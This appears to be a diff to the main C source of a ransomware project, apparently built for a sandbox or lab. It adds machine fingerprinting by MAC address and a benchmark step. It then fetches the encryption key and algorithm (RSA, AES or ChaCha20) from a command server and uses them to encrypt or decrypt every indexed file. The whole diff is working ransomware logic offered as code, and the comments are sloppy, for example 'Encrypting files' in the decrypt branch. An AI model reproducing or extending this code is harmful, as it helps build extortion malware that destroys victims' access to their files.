@@ -11,6 +11,10 @@
 
 #include "files_finder.h"
 #include "crypto_rsa.h"
+#include "crypto_aes.h"
+#include "crypto_chacha20.h"
+#include "benchmark.h"
+#include "server.h"
 
 int g_safeMode = 1;
 int g_encryption = 0;
@@ -76,6 +80,15 @@ int main(int argc, char const *argv[])
 {
 
     char* paths[] = {"/tmp/sandbox-ransomware/"};
+    unsigned char* id = NULL;
+    char* p_algo = NULL;
+    unsigned char* p_iv = NULL;
+    unsigned char* p_key = NULL;
+    unsigned char* p_macAddress = NULL;
+    EVP_PKEY* p_pubKey = NULL;
+    EVP_PKEY* p_privKey = NULL;
+    EVP_CIPHER_CTX* p_e_ctx = NULL;
+    EVP_CIPHER_CTX* p_d_ctx = NULL;
 
     /* Parse options */
     for (int i = 1; i < argc; i++)
@@ -123,37 +136,125 @@ int main(int argc, char const *argv[])
     /* Affichage des fichiers indexés */
     print_path_data(p_listFileData);
 
+    /* Get the identifier of the current computer */
+    p_macAddress = get_identifier();
+
     if (g_encryption)
     {
-        /* Get RSA public key from a file */
-        EVP_PKEY* p_pubKey = rsa_load_key("public.pem", OSSL_KEYMGMT_SELECT_PUBLIC_KEY);
+        /* Create benchmark structure to send to the server */
+        benchmarkData* p_benchmarkData = benchmark_pc(p_listFileData->totalSize);
+
+        /* Get the encryption key based on the benchmark */
+        p_key = (unsigned char*) get_encryption_key((char*)id, p_benchmarkData, &p_algo, (char**)&p_iv);
 
         printf("[+] Encryption key GET success\n");
 
-        /* Encrypt files */
-        printf("[+] Encrypting files\n");
-        rsa_encrypt_files(p_listFileData, p_pubKey);
+        if (p_algo != NULL)
+        {
+            printf("[+] Algorithm: %s\n", p_algo);
+            printf("[+] Encrypting files\n");
+            if (strncmp(p_algo, "RSA", 3) == 0)
+            {
+                /* Save the encryption key if rsa algorithm is chosen */
+                save_key((char*)p_key, ENC_RSA_KEY_NAME);
+                /* Get RSA public key from a file */
+                p_pubKey = rsa_load_key(ENC_RSA_KEY_NAME, OSSL_KEYMGMT_SELECT_PUBLIC_KEY);
+                /* Encrypt files */
+                rsa_encrypt_files(p_listFileData, p_pubKey);
+
+                /* Free key */
+                EVP_PKEY_free(p_pubKey);
+            } else if (strncmp(p_algo, "AES", 3) == 0)
+            {
+                /* Encrypt files */
+                p_e_ctx = load_aes_encryption_key(p_key, p_iv);
+                /* Encrypt files */
+                aes_encrypt_files(p_listFileData, p_e_ctx);
+
+                /* Free key and iv */
+                EVP_CIPHER_CTX_free(p_e_ctx);
+                free(p_iv);
+            } else if (strncmp(p_algo, "CHACHA20", 8) == 0)
+            {
+                /* Encrypt files */
+                p_e_ctx = load_chacha_encryption_key(p_key, p_iv);
+                /* Encrypt files */
+                chacha20_encrypt_files(p_listFileData, p_e_ctx);
+
+                /* Free key and iv */
+                EVP_CIPHER_CTX_free(p_e_ctx);
+                free(p_iv);
+            }
+        } else {
+            printf("[-] No algorithm specified\n");
+            exit(1);
+        }
+
         printf("[+] Files encrypted\n");
 
-        EVP_PKEY_free(p_pubKey);
+        /* Free memory */
+        free(p_key);
+        free(p_algo);
+
     }
 
     if (g_decryption)
     {
-        /* Get RSA private key from a file */
-        EVP_PKEY* p_privKey = rsa_load_key("private.pem", OSSL_KEYMGMT_SELECT_PRIVATE_KEY);
+        p_key = (unsigned char*)get_decryption_key((char*)id, &p_algo, (char**)&p_iv);
 
-        printf("[+] Encryption key GET success\n");
+        printf("[+] Decryption key GET success\n");
 
-        /* Decrypt files */
-        printf("[+] Decrypting files\n");
-        rsa_decrypt_files(p_listFileData, p_privKey);
+        if (p_algo != NULL)
+        {
+            printf("[+] Algorithm: %s\n", p_algo);
+            printf("[+] Encrypting files\n");
+            if (strncmp(p_algo, "RSA", 3) == 0)
+            {
+                /* Save the encryption key if rsa algorithm is chosen */
+                save_key((char*)p_key, DEC_RSA_KEY_NAME);
+                /* Get RSA public key from a file */
+                p_privKey = rsa_load_key(DEC_RSA_KEY_NAME, OSSL_KEYMGMT_SELECT_PRIVATE_KEY);
+                /* Decrypt files */
+                rsa_decrypt_files(p_listFileData, p_privKey);
+
+                /* Free key */
+                EVP_PKEY_free(p_privKey);
+            } else if (strncmp(p_algo, "AES", 3) == 0)
+            {
+                /* Encrypt files */
+                p_d_ctx = load_aes_decryption_key(p_key, p_iv);
+                /* Encrypt files */
+                aes_decrypt_files(p_listFileData, p_d_ctx);
+
+                /* Free key and iv */
+                EVP_CIPHER_CTX_free(p_d_ctx);
+                free(p_iv);
+            } else if (strncmp(p_algo, "CHACHA20", 8) == 0)
+            {
+                /* Encrypt files */
+                p_d_ctx = load_chacha_decryption_key(p_key, p_iv);
+                /* Encrypt files */
+                chacha20_decrypt_files(p_listFileData, p_d_ctx);
+
+                /* Free key and iv */
+                EVP_CIPHER_CTX_free(p_d_ctx);
+                free(p_iv);
+            }
+        } else {
+            printf("[-] No algorithm specified\n");
+            exit(1);
+        }
+
         printf("[+] Files decrypted\n");
 
-        EVP_PKEY_free(p_privKey);
+        /* Free memory */
+        free(p_key);
+        free(p_algo);
     }
 
-
+    /* Free memory */
     free_path_data(p_listFileData);
+    free(p_macAddress);
+
     return 0;
 }
